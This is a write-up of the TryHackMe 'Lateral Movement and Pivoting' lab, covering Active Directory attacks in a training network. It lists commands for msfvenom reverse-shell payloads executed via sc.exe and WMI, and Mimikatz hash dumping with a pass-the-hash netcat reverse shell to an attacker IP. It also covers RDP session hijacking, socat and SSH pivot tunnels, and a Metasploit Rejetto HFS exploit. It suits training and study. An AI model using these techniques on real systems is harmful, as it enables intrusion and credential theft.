# TryHackMe: Lateral Movement and Pivoting

A writeup covering the AD lateral movement techniques from TryHackMe's *Lateral Movement and Pivoting* room, including environment setup on a WSL2 Kali box (which came with its own set of gotchas).

## Environment

- **Attack box:** Kali Linux running under WSL2 on Windows
- **Connection:** OpenVPN, `.ovpn` config downloaded from the room's Network tab
- **Target network:** `10.200.74.0/24`
  - THMDC: `10.200.74.101`
  - THMIIS: `10.200.74.201`
  - THMJMP2: `10.200.74.249` (jump host / initial foothold)

### WSL2-Specific Setup Notes

Running OpenVPN and later SSH tunnels from WSL2 surfaced a few environment quirks worth documenting:

**TUN device.** WSL2 doesn't always ship with `/dev/net/tun` pre-created, which OpenVPN needs. Check with:
```bash
ls -la /dev/net/tun
```
If missing, create it manually (doesn't persist across WSL restarts):
```bash
sudo mkdir -p /dev/net
sudo mknod /dev/net/tun c 10 200
sudo chmod 666 /dev/net/tun
```

**DNS conflicts.** Pointing `/etc/resolv.conf` solely at the internal AD DNS server (THMDC) breaks resolution for the public internet (needed for `apt`, etc.), since AD DNS won't recurse externally. Fix by listing both:
```bash
sudo bash -c 'echo -e "nameserver 10.200.74.101\nnameserver 1.1.1.1" > /etc/resolv.conf'
```
Note: WSL2 can silently regenerate `/etc/resolv.conf`, wiping manual changes. To disable that behavior permanently, add to `/etc/wsl.conf`:
```
[network]
generateResolvConf = false
```
then `wsl --shutdown` from PowerShell and restart the distro.

**Minimal Kali install.** The default WSL Kali image ships without Metasploit, smbclient, or freerdp. Installed as needed:
```bash
sudo apt install -y metasploit-framework smbclient freerdp-x11 openssh-server
```

**FreeRDP + Kerberos.** WSL's FreeRDP client tried Kerberos auth by default and failed with `Cannot find KDC for realm` errors against the lab's AD domain. NTLM-based connections (plain `/u:` `/p:` `/d:`) worked once other auth issues were resolved.

## Requesting Credentials

Most tasks require hitting the credential distributor endpoint, which returns creds via an ASP.NET WebForms postback (viewstate tokens required). Scripted the button click with curl:
```bash
curl -s http://distributor.za.tryhackme.com/creds -c /tmp/thm_cookies.txt -o /tmp/creds_page.html

VIEWSTATE=$(grep -oP '(?<=__VIEWSTATE" id="__VIEWSTATE" value=")[^"]+' /tmp/creds_page.html)
GENERATOR=$(grep -oP '(?<=__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value=")[^"]+' /tmp/creds_page.html)
VALIDATION=$(grep -oP '(?<=__EVENTVALIDATION" id="__EVENTVALIDATION" value=")[^"]+' /tmp/creds_page.html)

curl -s -b /tmp/thm_cookies.txt \
  --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
  --data-urlencode "__VIEWSTATEGENERATOR=$GENERATOR" \
  --data-urlencode "__EVENTVALIDATION=$VALIDATION" \
  --data-urlencode "btnTestSettings=Get Credentials" \
  http://distributor.za.tryhackme.com/creds
```
(Task 6 uses a separate `/creds_t2` endpoint for a second identity.)

---

## Task 3 — Spawning Processes Remotely (sc.exe)

**Technique:** Remote service creation via `sc.exe`, using a service-formatted reverse shell payload (msfvenom's `exe-service` output) to survive the Service Control Manager killing non-service binaries.

Steps:
1. Generate payload: `msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<attacker_ip> LPORT=4444 -o payload.exe`
2. Upload to target's `ADMIN$` share: `smbclient -c 'put payload.exe' -U <user> -W ZA '//thmiis.za.tryhackme.com/admin$/' <pass>`
3. Start an `msfconsole` multi/handler listener on 4444
4. From the jump host, `runas /netonly /user:DOMAIN\<user>` a second shell back to a netcat listener (since `sc.exe` doesn't take credentials directly)
5. In that shell, `sc.exe \\target create <name> binPath= "%windir%\payload.exe" start= auto` then `sc.exe \\target start <name>`
6. Catch the reverse shell in msfconsole, navigate to the user's desktop, run `flag.exe`

**Flag:** `THM{MOVING_WITH_SERVICES}`

---

## Task 4 — Moving Laterally Using WMI

**Technique:** Remote MSI package installation via WMI's `Win32_Product` class, triggering an embedded reverse shell payload.

Steps:
1. Generate an MSI payload: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4445 -f msi > payload.msi`
2. Upload via `smbclient` to the target's `ADMIN$` share (lands in `C:\Windows\`)
3. Start a multi/handler listener on 4445
4. From PowerShell on the jump host, build a `PSCredential` and a CIM session:
   ```powershell
   $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
   $Opt = New-CimSessionOption -Protocol DCOM
   $Session = New-Cimsession -ComputerName <target> -Credential $credential -SessionOption $Opt -ErrorAction Stop
   ```
5. Trigger the install:
   ```powershell
   Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\payload.msi"; Options = ""; AllUsers = $false}
   ```
6. Catch the shell, grab `flag.exe` from the target user's desktop

**Flag:** `THM{MOVING_WITH_WMI_4_FUN}`

---

## Task 5 — Alternate Authentication Material (Pass-the-Hash)

**Technique:** Extracting an NTLM hash from LSASS memory with Mimikatz, then using Pass-the-Hash to authenticate as another user without knowing their password.

Steps:
1. SSH into the jump host with an account that has local admin rights there
2. Run Mimikatz, elevate, and dump credentials:
   ```
   privilege::debug
   token::elevate
   sekurlsa::msv
   ```
3. Locate the target user's NTLM hash in the output
4. Revert token, then inject the hash and spawn a reverse shell as that user:
   ```
   token::revert
   sekurlsa::pth /user:<target> /domain:<domain> /ntlm:<hash> /run:"c:\tools\nc64.exe -e cmd.exe <attacker_ip> 5555"
   ```
5. Note: `whoami` in the resulting shell still shows the *original* account — PtH only affects credentials presented for outbound network authentication, not the local token identity.
6. From that shell, use `winrs` (no explicit creds needed — it uses the injected material automatically):
   ```
   winrs.exe -r:<target_host> cmd
   ```
7. Grab `flag.exe` from the target user's desktop

**Flag:** `THM{NO_PASSWORD_NEEDED}`

---

## Task 6 — Abusing User Behaviour (RDP Session Hijacking)

**Technique:** Hijacking another user's disconnected RDP session using SYSTEM privileges — no password required (pre–Server 2019 behavior).

Steps:
1. RDP into the jump host with an account that has local admin rights
2. Open an admin Command Prompt, then elevate to SYSTEM with PsExec:
   ```
   C:\tools\PsExec64.exe -s cmd.exe
   ```
3. List sessions:
   ```
   query user
   ```
4. Identify a target session marked `Disc` (disconnected, safe to take over without kicking anyone out) and note its Session ID and your own current SESSIONNAME
5. Hijack it:
   ```
   tscon <target_session_id> /dest:<your_sessionname>
   ```
6. The RDP window instantly switches to the hijacked session — flag was visible directly on the hijacked desktop (open in Paint, in this instance)

**Flag:** `THM{NICE_WALLPAPER}`

---

## Task 7 — Port Forwarding

Two separate exercises, escalating in complexity.

### Part 1: socat pivot to RDP

The jump host can reach THMIIS's RDP port (3389), but the attacker machine can't reach it directly — only the jump host's own RDP port is exposed.

1. SSH into the jump host
2. Forward a local port on the jump host through to the target's RDP port using `socat`:
   ```
   socat TCP4-LISTEN:23389,fork TCP4:THMIIS.za.tryhackme.com:3389
   ```
3. From the attacker machine, RDP to the jump host on the forwarded port — this transparently lands on THMIIS:
   ```bash
   xfreerdp /v:thmjmp2.za.tryhackme.com:23389 /d:za /u:<user> /p:<pass> /cert:ignore
   ```
4. Grab the flag from the desktop

**Flag:** `THM{SIGHT_BEYOND_SIGHT}`

### Part 2: Tunneling a full Metasploit exploit (Rejetto HFS)

THMDC runs a vulnerable Rejetto HFS server, but:
- Its HFS port is only reachable from the jump host, not the attacker machine
- The exploit needs to host a callback web server, but THMDC can't reach the attacker's machine directly — only hosts inside its own local network

Solution: a single SSH command from the jump host, opening one **remote** forward (exposing THMDC's HFS port back to the attacker) and two **local** forwards (exposing the attacker's exploit web server and reverse shell listener out through the jump host):

1. On the attacker machine, create a restricted tunnel-only user and start an SSH server:
   ```bash
   sudo useradd tunneluser -m -d /home/tunneluser -s /bin/true
   sudo passwd tunneluser
   sudo apt install -y openssh-server
   sudo service ssh start
   ```
2. From the jump host, establish the multi-port tunnel:
   ```
   ssh tunneluser@<attacker_ip> -R 18888:thmdc.za.tryhackme.com:80 -L *:16666:127.0.0.1:16666 -L *:17878:127.0.0.1:17878 -N
   ```
   This hangs with no output when successful — that's expected.
3. On the attacker machine, configure and run the Metasploit exploit against the *local* forwarded ports rather than the real remote host:
   ```
   use exploit/windows/http/rejetto_hfs_exec
   set payload windows/shell_reverse_tcp
   set lhost thmjmp2.za.tryhackme.com
   set ReverseListenerBindAddress 127.0.0.1
   set lport 17878
   set srvhost 127.0.0.1
   set srvport 16666
   set rhosts 127.0.0.1
   set rport 18888
   exploit
   ```
   - `LHOST` is set to the jump host because that's where the payload connects back to (then tunneled onward to the attacker via `-R`)
   - `ReverseListenerBindAddress` keeps the actual listener bound locally on the attacker box
   - `RHOSTS`/`RPORT` point at `127.0.0.1:18888` because the `-R` forward routes that straight to THMDC's port 80
4. On success, a shell lands directly on THMDC. Flag located at `C:\hfs\flag.txt`

**Flag:** `THM{FORWARDING_IT_ALL}`

---

## Key Takeaways

- **UAC matters.** Non-default local administrator accounts get a filtered token over the network (RPC/SMB/WinRM) unless UAC remote restrictions are disabled — only the built-in Administrator account or domain admins escape this.
- **Alternate authentication material is powerful.** NTLM hashes, Kerberos tickets, and Kerberos keys are all independently sufficient for authentication — none require the plaintext password.
- **Pass-the-Hash preserves local identity.** `whoami` won't reflect the impersonated user; only outbound network authentication uses the injected material.
- **Port forwarding turns any foothold into a router.** SSH's built-in `-L`/`-R`/dynamic (`-D` + SOCKS) forwarding, or `socat` where SSH access isn't available, can chain arbitrarily many hops — including routing an entire exploit's multi-directional traffic (target callback, payload delivery, and reverse shell) through a single pivot host.
- **WSL2 as an attack platform works but has friction.** TUN device setup, DNS conflicts between lab and internet resolution, and Kerberos/NLA quirks in FreeRDP all needed workarounds that wouldn't come up on a native Linux box or the TryHackMe AttackBox.
